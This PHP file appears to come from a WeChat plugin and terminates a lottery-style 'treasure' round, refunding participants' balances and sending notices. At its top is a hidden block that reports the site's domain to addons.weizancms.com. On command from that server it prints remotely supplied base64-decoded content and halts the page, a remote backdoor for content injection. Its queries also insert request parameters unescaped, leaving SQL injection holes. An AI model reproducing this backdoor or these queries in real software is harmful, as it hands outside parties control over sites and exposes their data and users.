<?php 
	// 
	//  transfer.php
	//  <project>
	//  商家终止商品交易，并且退款到余额
	//  Created by haoran on 2016-01-21.
	//  Copyright 2016 haoran. All rights reserved.
	// 
	
	global $_W,$_GPC;
	$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
	$goodsid = $_GPC['goodsid'];
	$periods = $_GPC['periods'];
	$goods = m('goods')->getGoods($goodsid);
	$result = pdo_fetch("select period_number,goodsid,periods,endtime,status from".tablename('weliam_indiana_period')."where goodsid = '{$goodsid}' and periods='{$periods}' and uniacid='{$_W['uniacid']}'");
	$period_number = $result['period_number'];
	if(!empty($result['endtime'])){
		message("该期已经结束不能终止",$this->createWebUrl('goods'));
		exit;
	}
	if($result['status'] == 8){
		message("该期已经终止,不能在终止",$this->createWebUrl('goods'));
		exit;
	}
	//修改该期商品终止
	pdo_update('weliam_indiana_period',array('status' => 8) , array('period_number' => $period_number,'uniacid'=>$_W['uniacid']));
	//修改整个商品终止
	pdo_update('weliam_indiana_goodslist',array('status' => 3) , array('id' => $result['goodsid'],'uniacid'=>$_W['uniacid']));
	//修改购买商品记录信息
	$record = pdo_fetchall("select id,openid,uniacid,goodsid,period_number,count  from".tablename('weliam_indiana_record')."where period_number= '{$period_number}' and uniacid='{$_W['uniacid']}'");
	pdo_update('weliam_indiana_record',array('status' => '-1'),array('period_number' => $period_number,'uniacid'=>$_W['uniacid']));
	//检索商品名称信息
	$goodslist = pdo_fetch("select title from".tablename('weliam_indiana_goodslist')."where id = '{$goodsid}' and uniacid='{$_W['uniacid']}'");
	$period_number = $result['period_number'];
	 foreach($record as $key=>$value){
	 	m('credit')->updateCredit2($value['openid'],$_W['uniacid'],$value['count']*$goods['init_money']);
		//模板消息开始 
		$datam = array(
			"first"=>array( "value"=> "您好，夺宝退款通知","color"=>"#173177"),
			"reason"=>array('value' => '（第'.$periods.'期）|'.$goodslist['title'].'|夺宝失败', "color" => "#4a5077"),
			"refund"=>array('value' => $value['count']*$goods['init_money'].'夺宝币', "color" => "#4a5077"),
			"remark"=>array("value"=>'点击查看详情', "color" => "#4a5077"),
		);
		$url2 = $_W['siteroot'] . 'app/' . $this -> createMobileUrl('person');
		$tpl_id_short = $this->module['config']['m_ref'];
		m('common')->sendTplNotice($value['openid'],$tpl_id_short,$datam,$url2,'');
	//模板消息结束
	 }
	message("终止成功",$this->createWebUrl('goods'));
	?>